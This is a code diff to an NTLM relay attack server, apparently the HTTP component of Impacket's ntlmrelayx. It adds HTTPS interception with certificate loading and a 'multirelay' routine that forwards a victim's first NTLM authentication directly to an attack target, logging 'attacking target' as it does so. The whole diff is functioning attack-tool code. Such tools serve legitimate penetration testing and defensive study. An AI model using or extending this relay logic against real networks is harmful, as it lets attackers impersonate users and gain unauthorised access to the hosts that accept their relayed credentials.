@@ -23,10 +23,11 @@ import socketserver
 import socket
 import base64
 import random
+import ssl
 import struct
 import string
 from threading import Thread
-from six import PY2, b
+from six import b
 
 from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
@@ -46,6 +47,28 @@ class HTTPRelayServer(Thread):
             self.wpad_counters = {}
             socketserver.TCPServer.allow_reuse_address = True
             socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)
+
+            if self.config.https:
+                self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                self.context.load_cert_chain(certfile=self.config.certfile, keyfile=self.config.keyfile)
+
+        def get_request(self):
+            sock, addr = socketserver.TCPServer.get_request(self)
+            if self.config.https:
+                try:
+                    ssock = self.context.wrap_socket(sock, server_side=True)
+                    LOG.debug("(HTTP): TLS handshake from %s:%s succeeded (protocol=%s, cipher=%s)",
+                              addr[0], addr[1], ssock.version(), ssock.cipher())
+                    return ssock, addr
+                except ssl.SSLError as e:
+                    if "EOF" in str(e):
+                        LOG.warning("(HTTP): TLS handshake from %s:%s aborted early (likely client rejected cert)",
+                                    addr[0], addr[1])
+                    else:
+                        LOG.error("(HTTP): TLS handshake from %s:%s failed: %s", addr[0], addr[1], e)
+                    sock.close()
+                    raise
+            return sock, addr
 
     class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
@@ -137,16 +160,12 @@ class HTTPRelayServer(Thread):
                 self.wfile.write(imgFile_data)
 
         def strip_blob(self, proxy):
-            if PY2:
-                if proxy:
-                    proxyAuthHeader = self.headers.getheader('Proxy-Authorization')
-                else:
-                    autorizationHeader = self.headers.getheader('Authorization')
+            # Get the body of the request if any
+            # Otherwise, successive requests will not be handled properly
+            if proxy:
+                proxyAuthHeader = self.headers.get('Proxy-Authorization')
             else:
-                if proxy:
-                    proxyAuthHeader = self.headers.get('Proxy-Authorization')
-                else:
-                    autorizationHeader = self.headers.get('Authorization')
+                autorizationHeader = self.headers.get('Authorization')
 
             if (proxy and proxyAuthHeader is None) or (not proxy and autorizationHeader is None):
                 self.do_AUTHHEAD(message = b'NTLM',proxy=proxy)
@@ -194,13 +213,7 @@ class HTTPRelayServer(Thread):
 
             token, messageType = self.strip_blob(proxy)
 
-            # Should we relay or log-in locally?
-            if self.relayToHost is False and not self.server.config.disableMulti:
-                self.do_local_auth(messageType, token, proxy)
-                return
-            else:
-                # We can start the relay process
-                self.do_relay(messageType, token, proxy, content)
+            self.do_multirelay(messageType, token, proxy, content)
 
         def do_AUTHHEAD(self, message = b'', proxy=False):
             if proxy:
@@ -249,6 +262,13 @@ class HTTPRelayServer(Thread):
             return
 
         def do_GET(self):
+            contentLength = self.headers.get("Content-Length")
+            if contentLength is not None:
+                try:
+                    self.rfile.read(int(contentLength))
+                except Exception:
+                    pass
+
             if self.server.config.mode == 'REDIRECT':
                 self.do_SMBREDIRECT()
                 return
@@ -272,15 +292,28 @@ class HTTPRelayServer(Thread):
 
             token, messageType = self.strip_blob(proxy)
 
-            # Should we relay or log-in locally?
-            if self.relayToHost is False and not self.server.config.disableMulti:
-                self.do_local_auth(messageType, token, proxy)
-                return
-            else:
-                # We can start the relay process
-                self.do_relay(messageType, token, proxy)
+            self.do_multirelay(messageType, token, proxy)
 
             return
+
+        def do_multirelay(self, messageType, token, proxy, content=None):
+            if self.server.config.disableMulti or self.relayToHost:
+                return self.do_relay(messageType, token, proxy, content)
+
+            # The username is not available until the AUTHENTICATE_MESSAGE. If an
+            # unrestricted target exists, use its challenge for the first
+            # authentication instead of spending that authentication locally.
+            if messageType == 1:
+                self.target = self.server.config.target.getTarget()
+                if self.target is not None:
+                    LOG.info("(HTTP): Received connection from %s, attacking target %s://%s before identity discovery" %
+                             (self.client_address[0], self.target.scheme, self.target.netloc))
+                    self.relayToHost = True
+                    return self.do_relay(messageType, token, proxy, content)
+
+            # No unrestricted target is available. Authenticate locally so the
+            # identity can be used to select a username-bound target.
+            return self.do_local_auth(messageType, token, proxy)
 
         def do_ntlm_negotiate(self, token, proxy):
             if self.target.scheme.upper() in self.server.config.protocolClients:
@@ -428,9 +461,9 @@ class HTTPRelayServer(Thread):
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
+                self.authUser = authenticateMessage.getUserString()
 
                 if self.server.config.disableMulti:
-                    self.authUser = authenticateMessage.getUserString()
                     target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)
 
                 if not self.do_ntlm_auth(token, authenticateMessage):
